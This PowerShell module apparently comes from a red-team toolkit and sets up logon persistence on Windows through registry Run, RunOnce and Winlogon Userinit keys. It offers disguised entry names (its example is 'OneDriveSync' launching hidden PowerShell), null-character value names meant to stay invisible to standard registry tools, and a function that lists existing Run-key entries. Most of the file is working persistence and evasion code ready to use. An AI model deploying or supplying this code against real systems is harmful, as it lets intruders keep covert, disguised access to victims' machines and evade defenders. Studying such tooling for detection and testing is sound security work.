<#
.SYNOPSIS
    Establish persistence via Windows Registry Run keys

.DESCRIPTION
    Creates registry entries that execute commands at user logon or system startup.
    Supports multiple registry locations with varying visibility.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER Command
    Command or path to execute

.PARAMETER Name
    Registry value name (disguise as legitimate)

.PARAMETER Method
    Registry location to use

.PARAMETER Remove
    Remove persistence entry

.EXAMPLE
    Invoke-RegistryPersistence -Command "powershell.exe -WindowStyle Hidden -Command ..." -Name "OneDriveSync"
    Invoke-RegistryPersistence -Name "OneDriveSync" -Remove
#>

function Invoke-RegistryPersistence {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Add')]
        [string]$Command,

        [Parameter(Mandatory)]
        [string]$Name,

        [ValidateSet('CurrentUser', 'LocalMachine', 'CurrentUserRunOnce', 'LocalMachineRunOnce', 'Winlogon')]
        [string]$Method = 'CurrentUser',

        [Parameter(ParameterSetName = 'Remove')]
        [switch]$Remove
    )

    # Define registry paths
    $registryPaths = @{
        'CurrentUser'          = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        'LocalMachine'         = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
        'CurrentUserRunOnce'   = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        'LocalMachineRunOnce'  = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        'Winlogon'             = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
    }

    $regPath = $registryPaths[$Method]

    if ($Remove) {
        Write-Host "[*] Removing persistence entry: $Name from $Method" -ForegroundColor Yellow

        try {
            if ($Method -eq 'Winlogon') {
                # For Winlogon, we need to restore original values
                Write-Warning "Winlogon keys require manual restoration of original values"
                return
            }

            Remove-ItemProperty -Path $regPath -Name $Name -ErrorAction Stop
            Write-Host "[+] Persistence entry removed" -ForegroundColor Green
        }
        catch {
            Write-Error "Failed to remove entry: $_"
        }
        return
    }

    if (-not $Command) {
        Write-Error "Command is required when adding persistence"
        return
    }

    Write-Host @"

============================================================
  REGISTRY PERSISTENCE
============================================================
  Method: $Method
  Path: $regPath
  Name: $Name
  Command: $Command
============================================================

"@ -ForegroundColor Cyan

    # Check admin requirement for HKLM
    if ($Method -match 'LocalMachine|Winlogon') {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            Write-Error "Administrator privileges required for $Method"
            return
        }
    }

    try {
        if ($Method -eq 'Winlogon') {
            # Winlogon requires modifying existing keys
            $currentUserinit = (Get-ItemProperty $regPath).Userinit

            if ($currentUserinit -notmatch [regex]::Escape($Command)) {
                $newValue = "$currentUserinit,$Command"
                Set-ItemProperty -Path $regPath -Name 'Userinit' -Value $newValue
                Write-Host "[+] Appended to Userinit" -ForegroundColor Green
            }
            else {
                Write-Host "[*] Command already in Userinit" -ForegroundColor Yellow
            }
        }
        else {
            # Standard Run key
            New-ItemProperty -Path $regPath -Name $Name -Value $Command -PropertyType String -Force | Out-Null
            Write-Host "[+] Persistence entry created" -ForegroundColor Green
        }

        Write-Host @"

[*] PERSISTENCE DETAILS:
    Registry: $regPath
    Name: $Name
    Value: $Command

[*] VERIFICATION:
    Get-ItemProperty "$regPath" -Name "$Name"

[*] REMOVAL:
    Invoke-RegistryPersistence -Name "$Name" -Method $Method -Remove
"@ -ForegroundColor Cyan

    }
    catch {
        Write-Error "Failed to create persistence: $_"
    }
}

function Get-RegistryPersistence {
    <#
    .SYNOPSIS
        List all persistence entries in common registry locations

    .EXAMPLE
        Get-RegistryPersistence
    #>
    [CmdletBinding()]
    param()

    $locations = @(
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run',
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
    )

    $results = @()

    foreach ($location in $locations) {
        if (Test-Path $location) {
            $props = Get-ItemProperty $location -ErrorAction SilentlyContinue
            if ($props) {
                $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                    $results += [PSCustomObject]@{
                        Location = $location
                        Name     = $_.Name
                        Value    = $_.Value
                    }
                }
            }
        }
    }

    if ($results.Count -gt 0) {
        Write-Host "[+] Found $($results.Count) persistence entries:" -ForegroundColor Green
        return $results | Format-Table -AutoSize -Wrap
    }
    else {
        Write-Host "[-] No persistence entries found" -ForegroundColor Yellow
    }
}

function New-HiddenRegistryKey {
    <#
    .SYNOPSIS
        Create registry key with null character (harder to detect)

    .DESCRIPTION
        Creates a registry key name starting with a null character.
        This makes the key invisible to standard registry tools.

    .EXAMPLE
        New-HiddenRegistryKey -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "HiddenKey" -Value "cmd.exe"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Path,

        [Parameter(Mandatory)]
        [string]$Name,

        [Parameter(Mandatory)]
        [string]$Value
    )

    Write-Warning "This technique creates a registry value that is hidden from standard tools"

    # Add null character prefix
    $hiddenName = "$([char]0)$Name"

    try {
        # Use .NET registry classes for null character support
        $regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(
            $Path.Replace("HKCU:\", ""), $true
        )

        if ($regKey) {
            $regKey.SetValue($hiddenName, $Value)
            $regKey.Close()
            Write-Host "[+] Hidden registry value created" -ForegroundColor Green
        }
        else {
            Write-Error "Could not open registry key"
        }
    }
    catch {
        Write-Error "Failed to create hidden key: $_"
    }
}

# Export functions
Export-ModuleMember -Function Invoke-RegistryPersistence, Get-RegistryPersistence, New-HiddenRegistryKey
